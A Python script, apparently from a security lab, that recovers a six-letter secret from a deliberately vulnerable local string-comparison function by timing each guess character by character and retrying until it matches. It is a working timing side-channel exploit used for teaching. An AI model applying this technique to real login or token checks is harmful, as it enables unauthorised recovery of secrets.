import time
from vul_timing_sc import insecureStringCompare

def breaker(secret_length = 6):
    guessed_secret = ""
    possible_chars = "abcdefghijklmnopqrstuvwxyz"

    while len(guessed_secret) < secret_length:
        max_time = 0
        best_guess = None
    
        # Test each character in the possible_chars
        for char in possible_chars:
            test_input = guessed_secret + char + "a" * (secret_length - len(guessed_secret) - 1)  # String handling
            start_time = time.time()
            insecureStringCompare(test_input)  # Call the vulnerable function
            elapsed_time = time.time() - start_time
    
            # Identify the character that took the longest time (more likely to match)
            if elapsed_time > max_time:
                max_time = elapsed_time
                best_guess = char
    
        guessed_secret += best_guess 
        print(f"\tGuessed so far: {guessed_secret}")
    return guessed_secret


TryTimes = 0
while(1):
    print ("\n### %-2d Trying......." %TryTimes)
    guessed_secret = breaker()
    if (insecureStringCompare (guessed_secret) == True):
    	print (f"{TryTimes}Guess successfully, secret = {guessed_secret}")
    	break
    else:
        print (f"{TryTimes}Guess failed, continue trying")
    TryTimes += 1